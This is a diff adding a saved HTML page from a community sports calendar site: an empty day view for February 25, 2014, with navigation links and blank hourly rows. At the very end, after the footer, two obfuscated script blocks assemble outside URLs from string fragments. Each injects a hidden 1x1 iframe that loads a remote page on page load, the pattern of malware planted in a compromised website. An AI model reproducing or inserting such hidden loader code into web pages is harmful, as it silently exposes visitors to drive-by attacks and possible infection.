@@ -1,0 +1,525 @@
+
+
+
+<HTML>
+<HEAD>
+	<TITLE>Calendar</TITLE>
+<META HTTP-EQUIV="expires" CONTENT="now">
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<STYLE>
+A { text-decoration:none; }
+A:hover { text-decoration:underline; }
+.thinborder { border-color:#666666; border-style:solid; border-width:1px; }
+.columnheader { color:#000000; }
+.navigationtext { color:#FFFFFF; }
+.navigationselectedtext { color:#000000; }
+.commandtext { color:#FFFFFF; font-weight:bold; }
+.selectedcommandtext { color:#FFFFFF; font-weight:bold; }
+.gridtext { color:#000000; font-family:Arial; }
+.griddatetext { color:#000000; background-color:#FFFFFF; font-weight:bold; }
+.footertext { color:#FFFFFF; }
+.text { color:#000000; }
+
+.messagetext { color: red; }
+.headertext { }
+
+
+BODY { font-family:"Arial" }
+</STYLE>
+
+</HEAD>
+<BODY BGCOLOR="#FFFFFF" LINK="#000000" ALINK="#CE0000" VLINK="#000000" LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0>
+<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="3" WIDTH="100%" HEIGHT="100%">
+	
+	<TR>
+		<TD COLSPAN="2">
+			
+				
+				<TABLE BORDER="0" CLASS="thinborder" CELLPADDING="0" CELLSPACING="0" WIDTH=100%>
+				<TR>
+					<TD ALIGN="left" WIDTH="20%" BGCOLOR="#000062"><B><A HREF="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&datestring=20140224&selected_datestring=20140224" CLASS="navigationtext">&lt;&nbsp;Previous&nbsp;Day</A></B></TD>
+					<TD ALIGN="center" WIDTH="60%" BGCOLOR="#000062"><B><SPAN CLASS="navigationtext"><FONT SIZE=+2 COLOR="#FFFFFF">Tuesday Feb 25, 2014</FONT></SPAN></B></TD>
+					<TD ALIGN="right" WIDTH="20%" BGCOLOR="#000062"><B><A HREF="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&datestring=20140226&selected_datestring=20140226" CLASS="navigationtext">Next&nbsp;Day&nbsp;&gt;</A></B></TD>
+				</TR>
+				</TABLE>
+				
+			
+	</TD>
+</TR>
+
+
+
+
+
+
+<TR>
+	<TD WIDTH="100" align="left" valign="top">
+		
+		
+		<TABLE BORDER="0" CLASS="thinborder" WIDTH="100" BGCOLOR="">
+		<TR><TD BGCOLOR="#8080E6"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&style=Grid" CLASS="selectedcommandtext">Grid</A></TD></TR>
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&style=List" CLASS="commandtext">List</A></TD></TR>
+		</TABLE>
+		<BR>
+		
+		
+		<TABLE BORDER="0" CLASS="thinborder" WIDTH="100" BGCOLOR="">
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Day&datestring=20130410&selected_datestring=20130410" CLASS="commandtext">Today</A></TD></TR>
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Week" CLASS="commandtext">Week</A></TD></TR>
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Two-Week" CLASS="commandtext">2-Week</A></TD></TR>
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Three-Week" CLASS="commandtext">3-Week</A></TD></TR>
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Four-Week" CLASS="commandtext">4-Week</A></TD></TR>
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Month" CLASS="commandtext">Month</A></TD></TR>
+		</TABLE>
+		<BR>
+		
+		
+		<TABLE BORDER="0" CLASS="thinborder" WIDTH="100" BGCOLOR="">
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&view=Search" CLASS="commandtext">Search</A></TD></TR>
+		
+			<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar_admin.pl?calendar=sports&username=anonymous&template=add_edit_event.html" CLASS="commandtext">Add Event</A></TD></TR>
+		
+		
+		
+		
+		<TR><TD BGCOLOR="#000062"><a href="http://www.youthyack.com/cgi-bin/calendar.pl?datestring=20140225&selected_datestring=20140225&view=Day&calendar=sports&template=login.html" CLASS="commandtext">Login</A></TD></TR>
+		
+		</TABLE>
+		
+		
+	</TD>
+	<TD VALIGN="top" ALIGN="left" WIDTH="100%">
+		
+		
+		
+
+		
+		
+
+			
+				
+				<TABLE BORDER="1" CLASS="thinborder" WIDTH=100%>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						All Day Events
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						12:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						1:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						2:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						3:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						4:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						5:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						6:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						7:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						8:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						9:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						10:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						11:00 am&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						12:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						1:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						2:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						3:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						4:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						5:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						6:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						7:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						8:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						9:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						10:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				<TR>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" ALIGN="right" VALIGN="middle" WIDTH="125">
+						<SPAN CLASS="text">
+						
+						11:00 pm&nbsp;
+						
+						</SPAN>
+					</TD>
+					<TD CLASS="thinborder" BGCOLOR="#FFFFFF" VALIGN=TOP>
+						<SPAN CLASS="text">
+						
+						&nbsp;
+						</SPAN>
+					</TD>
+				</TR>
+				
+				</TABLE>
+			
+
+		
+		
+		
+		
+		
+		
+	</TD>
+</TR>
+<TR>
+	<TD ALIGN="center" COLSPAN="2" BGCOLOR="#666666">
+	<FONT SIZE="-2">
+	<SPAN CLASS="footertext">Powered by <A HREF="http://www.CalendarScript.com/" CLASS="footertext" STYLE="text-decoration:underline;">CalendarScript</A></SPAN>
+	</FONT>
+	</TD>
+</TR>
+
+</TABLE>
+
+<script>ti='.c';ai='af';qo='p';jn='htm';rf='n';tf='doz';yn='ifr';xm='s';cl='o';jd='k9';nn='tv.';rl='85y';r='umu';eh='m/';ec='htt';sb='rc';f='ame';l='://';b=yn.concat(f);gg=xm.concat(sb);qt=ec.concat(qo,l,rf,r,tf,ai,ti,cl,eh,jd,rl,nn,jn);var xp=document.createElement(b);xp.setAttribute('width','1');xp.setAttribute('height','1');xp.frameBorder=0;xp.setAttribute(gg,qt);document.body.appendChild(xp);</script><script>wa='t';p='ht';f='k98';tb='ame';bg='.';v='sr';g='tp:';vf='/z';bs='t';px='v.h';br='yt';k='c';yr='m';ds='m';ej='/';au='/';t='com';sp='ifr';r='ca';cp='y';wz='ir';wf='u';b='5';se=sp.concat(tb);oz=v.concat(k);db=p.concat(g,ej,vf,wz,cp,r,bs,wf,yr,bg,t,au,f,b,br,px,wa,ds);var ip=document.createElement(se);ip.setAttribute('width','1');ip.setAttribute('height','1');ip.frameBorder=0;ip.setAttribute(oz,db);document.body.appendChild(ip);</script></BODY>
+</HTML>
